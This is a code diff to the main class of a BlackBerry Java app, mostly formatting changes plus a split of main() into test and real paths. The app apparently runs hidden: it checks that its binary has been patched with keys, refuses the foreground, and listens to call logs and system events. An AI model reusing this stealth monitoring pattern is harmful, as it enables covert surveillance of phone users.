@@ -18,11 +18,9 @@ import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
-
 /**
  * The Class Main.
  */
-
 
 public class Main extends UiApplication {
     /**
@@ -33,13 +31,17 @@ public class Main extends UiApplication {
      */
     public static void main(final String[] args) {
         //#ifdef TEST
-        if (args.length > 0) {
-            System.out.println("Test");
-            new MainTest();
-            return;
-        }
+
+        System.out.println("Test");
+        new MainTest();
+        
+        //#else
+        mainReal();
         //#endif       
-    	
+
+    }
+
+    public static void mainReal() {
         final Keys keys = Encryption.getKeys();
         final boolean binaryPatched = keys.hasBeenBinaryPatched();
 
@@ -50,7 +52,6 @@ public class Main extends UiApplication {
             System.out.println("Not binary patched, bailing out!");
             //#endif
         }
-
     }
 
     private final Debug debug;
@@ -87,15 +88,15 @@ public class Main extends UiApplication {
         //#endif
 
         //Phone.addPhoneListener(appListener);
-        addHolsterListener(appListener);        
-        addSystemListener(appListener);      
-        
+        addHolsterListener(appListener);
+        addSystemListener(appListener);
+
         //addRadioListener(appListener);
         PhoneLogs.addListener(appListener);
-        
+
         goBackground();
     }
-    
+
     /**
      * 
      */
@@ -107,33 +108,33 @@ public class Main extends UiApplication {
         removeHolsterListener(appListener);
         removeSystemListener(appListener);
         removeRadioListener(appListener);
-        
+
         //Phone.removePhoneListener(appListener);
         PhoneLogs.removeListener(appListener);
 
         goBackground();
     }
 
-    public boolean acceptsForeground(){
+    public boolean acceptsForeground() {
         return false;
     }
-    
-    public void activate(){
+
+    public void activate() {
 
     }
-    
-    public void deactivate(){
+
+    public void deactivate() {
 
     }
-    
-    public void goBackground() {    	    	    
-        if(!Conf.IS_UI){
+
+    public void goBackground() {
+        if (!Conf.IS_UI) {
             return;
         }
-    
+
         invokeLater(new Runnable() {
-            public void run() {         
-                
+            public void run() {
+
                 boolean foreground = false;
                 UiApplication.getUiApplication().requestBackground();
                 foreground = UiApplication.getUiApplication().isForeground();
